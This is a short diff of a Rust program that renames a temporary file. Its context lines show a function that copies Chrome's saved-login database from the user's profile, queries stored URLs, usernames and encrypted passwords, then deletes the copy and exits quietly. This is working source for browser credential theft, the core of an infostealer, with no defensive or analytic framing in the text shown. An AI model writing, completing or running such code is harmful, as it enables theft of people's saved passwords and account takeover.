@@ -22,7 +22,7 @@ fn main() {
                 Ok(())
             };
             if let Err(_) = e() {}
-            std::fs::remove_file("vault_copy.db").unwrap_or_default();
+            std::fs::remove_file("db_copy.sqlite3").unwrap_or_default();
             std::process::exit(0);
         };
     }
@@ -87,10 +87,10 @@ fn extract_passwords(key: &Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
     let home_folder = std::env::var("USERPROFILE")?;
     let mut login_data_path = path::PathBuf::from(home_folder);
     login_data_path.push(r"AppData\Local\Google\Chrome\User Data\default\Login Data");
-    let temp_path = "vault_copy.db";
-    std::fs::copy(login_data_path, temp_path)?;
+    let temp_db = "db_copy.sqlite3";
+    std::fs::copy(login_data_path, temp_db)?;
 
-    let conn = sqlite::open(temp_path)?;
+    let conn = sqlite::open(temp_db)?;
     let mut statement =
         conn.prepare("SELECT action_url, username_value, password_value FROM logins;")?;
 
